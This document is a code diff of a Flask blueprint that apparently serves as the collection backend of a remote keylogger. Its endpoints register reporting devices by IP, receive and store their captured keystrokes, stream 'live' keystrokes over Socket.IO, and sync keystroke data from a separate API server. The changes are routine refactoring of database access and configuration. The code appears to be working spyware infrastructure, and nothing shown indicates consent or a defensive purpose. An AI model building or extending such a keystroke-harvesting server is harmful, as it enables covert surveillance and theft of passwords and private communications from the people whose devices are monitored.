@@ -1,10 +1,12 @@
+import os
 from flask import Blueprint, render_template, request, jsonify, current_app, redirect, url_for
 from ..auth import auth_required
 from models.devices import Device, Keystroke
 from datetime import datetime, timedelta
 from logzero import logger
 from sqlalchemy import desc
-from apis.keylogger import *
+from user.apis.keylogger import getAllKeystrokes, enableLiveKeylogger, disableLiveKeylogger, getKeyloggerStatus
+from config.database import db
 import requests
 
 keylogger_command = Blueprint('keylogger_command', __name__)
@@ -86,7 +88,7 @@ def receive_keystrokes(device_id):
         device = Device.query.filter_by(device_id=device_id).first()
         if not device:
             device = Device(device_id=device_id, device_ip=request.remote_addr)
-            current_app.db.session.add(device)
+            db.session.add(device)
 
         # Update last seen
         device.last_seen = datetime.now()
@@ -110,10 +112,10 @@ def receive_keystrokes(device_id):
                 event_type=keystroke_data.get('event_type'),
                 timestamp=timestamp
             )
-            current_app.db.session.add(keystroke)
+            db.session.add(keystroke)
             keystroke_objects.append(keystroke)
 
-        current_app.db.session.commit()
+        db.session.commit()
         logger.info(f"Saved {len(keystroke_objects)} keystrokes for device {device_id}")
 
         # If this is a live mode keystroke, emit to socket
@@ -155,7 +157,7 @@ def receive_keystrokes(device_id):
 
         return jsonify({"status": "success", "keystrokes_saved": len(keystroke_objects)})
     except Exception as e:
-        current_app.db.session.rollback()
+        db.session.rollback()
         logger.error(f"Error receiving keystrokes: {str(e)}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
@@ -199,8 +201,8 @@ def sync_keystrokes(device_id):
     """Endpoint to sync keystroke data from API app to user app and emit through Socket.IO"""
     try:
         # Configuration - API app host and port
-        API_HOST = '127.0.0.1'  # Change to the IP of your API server if different
-        API_PORT = 8000  # Change to the port of your API server
+        API_HOST = os.getenv('API_HOST', '127.0.0.1')
+        API_PORT = int(os.getenv('API_PORT', 8000))
 
         # Get the latest keystroke timestamp we have
         latest_keystroke = Keystroke.query.filter_by(device_id=device_id).order_by(
@@ -239,7 +241,7 @@ def sync_keystrokes(device_id):
                     event_type=keystroke_data.get('event_type'),
                     timestamp=timestamp
                 )
-                current_app.db.session.add(keystroke)
+                db.session.add(keystroke)
                 keystrokes_processed += 1
                 
                 # Check if this is a live keystroke
@@ -248,7 +250,7 @@ def sync_keystrokes(device_id):
                     live_keystrokes.append(keystroke_data)
             
             # Save to database
-            current_app.db.session.commit()
+            db.session.commit()
             
             # Emit live keystrokes via Socket.IO
             for keystroke_data in live_keystrokes:
